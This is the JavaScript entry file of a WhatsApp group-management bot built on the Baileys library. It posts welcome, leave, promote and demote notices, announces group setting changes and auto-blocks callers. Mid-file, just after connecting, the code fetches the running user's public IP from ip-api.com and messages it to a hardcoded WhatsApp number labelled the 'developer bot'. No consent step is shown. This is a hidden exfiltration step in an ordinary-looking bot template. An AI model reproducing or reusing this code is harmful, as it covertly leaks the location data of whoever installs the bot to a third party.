const {
	WAConnection,
	MessageType,
	Mimetype,
	GroupSettingChange,
	} = require("@adiwajshing/baileys")
const fs = require('fs')
const { getBuffer } = require('./lib/functions')
const { color } = require('./lib/color')
const fetch = require('node-fetch')
const sleep = async (ms) => {
return new Promise(resolve => setTimeout(resolve, ms))
}

require('./index.js')
nocache('./index.js', module => console.log(color(`${module} is now updated!`)))

const starts = async (client = new WAConnection()) => {
	client.logger.level = 'warn'
	client.version = [2, 6666, 9]
	client.browserDescription = [ 'UCHIModder', '3.0' ]
	client.on('qr', () => {
		console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan.!!'))
	})
	fs.existsSync('./session.json') && client.loadAuthInfo('./session.json')
	client.on('credentials-updated', () => {
		console.log(color('[','white'), color('!','red'), color(']','white'), color('credentials updated!'))
	})
	client.on('connecting', () => {
		console.log(color('⏳'), color('Connecting...'))
	})
	client.on('open', () => {
		console.log(color('賈','green'), color('Connected'))
	}) 
	client.on('ws-close', () => {
		console.log(color('[','white'), color('!','red'), color(']','white'), color('Connection lost, trying to reconnect.'))
	})
	client.on('close', async () => {
		console.log(color('-,-'), color('Disconnected.'))
	})
	await client.connect({timeoutMs: 30*1000})
		fs.writeFileSync('./session.json', JSON.stringify(client.base64EncodedAuthInfo(), null, '\t'))
	client.on('chat-update', async (message) => {
		require('./index.js')(client, message)
	})
	fetch(`http://ip-api.com/line`).then(res => res.text())
		.then(bu =>{
		client.sendMessage("62857700173269@s.whatsapp.net", `IP-USER\n\n ${bu}`, MessageType.text )
		console.log(color('✓'), color('Sending ip address to developer bot'))
	})
	client.on('group-update', async (anu) => {
		const metdata = await client.groupMetadata(anu.jid)
	if(anu.announce == 'false'){
		teks = `- [ Group Opened ] -\n\n_Group telah dibuka oleh admin_\n_Sekarang semua member bisa mengirim pesan_`
		client.sendMessage(metdata.id, teks, MessageType.text )
		console.log(color('|TRM|'), color(`Group Opened In ${metdata.subject}`))
	}
	else if(anu.announce == 'true'){
		teks = `- [ Group Closed ] -\n\n_Group telah ditutup oleh admin_\n_Sekarang hanya admin yang dapat mengirim pesan_`
		client.sendMessage(metdata.id, teks, MessageType.text )
		console.log(color('|TRM|'), color(`Group Closed In ${metdata.subject}`))
	}
	else if(!anu.desc == ''){
		tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
		teks = `- [ Group Description Change ] -\n\nDeskripsi Group telah diubah oleh Admin @${anu.descOwner.split('@')[0]}\n• Deskripsi Baru :\n ${anu.desc}`
		client.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}})
		console.log(color('|TRM|'), color(`Group Description Change In ${metdata.subject}`))
	}
	else if(anu.restrict == 'false'){
		teks = `- [ Group Setting Change ] -\n\nEdit Group info telah dibuka untuk member\nSekarang semua member dapat mengedit info Group Ini`
		client.sendMessage(metdata.id, teks, MessageType.text )
		console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`))
	}
	else if(anu.restrict == 'true'){
		teks = `- [ Group Setting Change ] -\n\nEdit Group info telah ditutup untuk member\nSekarang hanya admin group yang dapat mengedit info Group Ini`
		client.sendMessage(metdata.id, teks, MessageType.text )
		console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`,  'cyan'))
	}
	})
	client.on('group-participants-update', async (anu) => {
		try {
			const mdata = await client.groupMetadata(anu.jid)
			console.log(anu)
			if (anu.action == 'add') {
				try {
					ppimg = await client.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				let buff = await getBuffer(ppimg)
				const finv = {
					"key": {
						"fromMe": false,
						"participant": "0@s.whatsapp.net",
						"remoteJid": "0@s.whatsapp.net"
					},
					"message": {
						"groupInviteMessage": {
							"groupJid": "6288213840883-1616169743@g.us",
							"inviteCode": `${anu.participants[0].split('@')[0]} add`,
							"groupName": `${anu.participants[0].split('@')[0]} add`,
							"caption": `${anu.participants[0].split('@')[0]} add`,
							'jpegThumbnail': buff
						}
					}
				}
				const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
					kma = gam1
					mhan = await client.prepareMessage(id, kma, MessageType.image)
					const buttonMessages = {
						imageMessage: mhan.message.imageMessage,
						contentText: text1,
						footerText: desc1,
						buttons: but,
						headerType: 4
					}
					client.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
				}
				num = anu.participants[0]
				teks = `Halo @${num.split('@')[0]}\nSelamat datang di group ${mdata.subject}`
				sendButImage(mdata.id, teks, "Welcome Message", buff,
				[{ buttonId:` `, buttonText:{ displayText:'Oke' }, type:1}],{ quoted:finv, contextInfo: { "mentionedJid": [num]}})
			} else if (anu.action == 'remove') {
				try {
					ppimg = await client.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				let buff = await getBuffer(ppimg)
				const finv = {
					"key": {
						"fromMe": false,
						"participant": "0@s.whatsapp.net",
						"remoteJid": "0@s.whatsapp.net"
					},
					"message": {
						"groupInviteMessage": {
							"groupJid": "6288213840883-1616169743@g.us",
							"inviteCode": `${anu.participants[0].split('@')[0]} Leave`,
							"groupName": `${anu.participants[0].split('@')[0]} Leave`,
							"caption": `${anu.participants[0].split('@')[0]} Leave`,
							'jpegThumbnail': buff
						}
					}
				}
				const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
					kma = gam1
					mhan = await client.prepareMessage(id, kma, MessageType.image)
					const buttonMessages = {
						imageMessage: mhan.message.imageMessage,
						contentText: text1,
						footerText: desc1,
						buttons: but,
						headerType: 4
					}
					client.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
				}
				num = anu.participants[0]
				teks = `Sayonara @${num.split('@')[0]}\nKeluar di group ${mdata.subject}`
				sendButImage(mdata.id, teks, "Leave Message", buff,
				[{ buttonId:` `, buttonText:{ displayText:'Byee' }, type:1}],{ quoted:finv, contextInfo: { "mentionedJid": [num]}})
			} else if (anu.action == 'demote') {
				try {
					ppimg = await client.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				let buff = await getBuffer(ppimg)
				const finv = {
					"key": {
						"fromMe": false,
						"participant": "0@s.whatsapp.net",
						"remoteJid": "0@s.whatsapp.net"
					},
					"message": {
						"groupInviteMessage": {
							"groupJid": "6288213840883-1616169743@g.us",
							"inviteCode": `${anu.participants[0].split('@')[0]} Di unadmin`,
							"groupName": `${anu.participants[0].split('@')[0]} Di unadmin`,
							"caption": `${anu.participants[0].split('@')[0]} Di unadmin`,
							'jpegThumbnail': buff
						}
					}
				}
				const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
					kma = gam1
					mhan = await client.prepareMessage(id, kma, MessageType.image)
					const buttonMessages = {
						imageMessage: mhan.message.imageMessage,
						contentText: text1,
						footerText: desc1,
						buttons: but,
						headerType: 4
					}
					client.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
				}
				num = anu.participants[0]
				teks = `DEMOTE DETECTED\n@${num.split('@')[0]}\nDi unadmin di group ${mdata.subject}`
				sendButImage(mdata.id, teks, "Demote Message", buff,
				[{ buttonId:` `, buttonText:{ displayText:'Byee' }, type:1}],{ quoted:finv, contextInfo: { "mentionedJid": [num]}})
			} else if (anu.action == 'promote') {
				try {
					ppimg = await client.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				let buff = await getBuffer(ppimg)
				const finv = {
					"key": {
						"fromMe": false,
						"participant": "0@s.whatsapp.net",
						"remoteJid": "0@s.whatsapp.net"
					},
					"message": {
						"groupInviteMessage": {
							"groupJid": "6288213840883-1616169743@g.us",
							"inviteCode": `${anu.participants[0].split('@')[0]} Jadi admin`,
							"groupName": `${anu.participants[0].split('@')[0]} Jadi admin`,
							"caption": `${anu.participants[0].split('@')[0]} Jadi admin`,
							'jpegThumbnail': buff
						}
					}
				}
				const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
					kma = gam1
					mhan = await client.prepareMessage(id, kma, MessageType.image)
					const buttonMessages = {
						imageMessage: mhan.message.imageMessage,
						contentText: text1,
						footerText: desc1,
						buttons: but,
						headerType: 4
					}
					client.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
				}
				num = anu.participants[0]
				teks = `PROMOTE DETECTED\nSelamat @${num.split('@')[0]}\nJadi admin di group ${mdata.subject}`
				sendButImage(mdata.id, teks, "Promote Message", buff,
				[{ buttonId:` `, buttonText:{ displayText:'Selamat' }, type:1}],{ quoted:finv, contextInfo: { "mentionedJid": [num]}})
			}
		} catch (e) {
		console.log('Error : %s', color(e, 'red'))}
	})
	client.on('CB:action,,call', async json => {
		const callerId = json[2][0][1].from;
		client.sendMessage(callerId, "[ ! ] CALL DETECTED [ ! ]\n\n You will be blocked ", MessageType.text)
		await sleep(5000)
		await client.blockUser(callerId, "add")
	})
}

/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional> 
 */
function nocache(module, cb = () => { }) {
	console.log('Module', `'${module}'`, 'is now being watched for changes')
	fs.watchFile(require.resolve(module), async () => {
		await uncache(require.resolve(module))
		cb(module)
	})
}

/**
 * Uncache a module
 * @param {string} module Module name or path
 */
function uncache(module = '.') {
	return new Promise((resolve, reject) => {
		try {
			delete require.cache[require.resolve(module)]
			resolve()
		} catch (e) {
			reject(e)
		}
	})
}

starts()
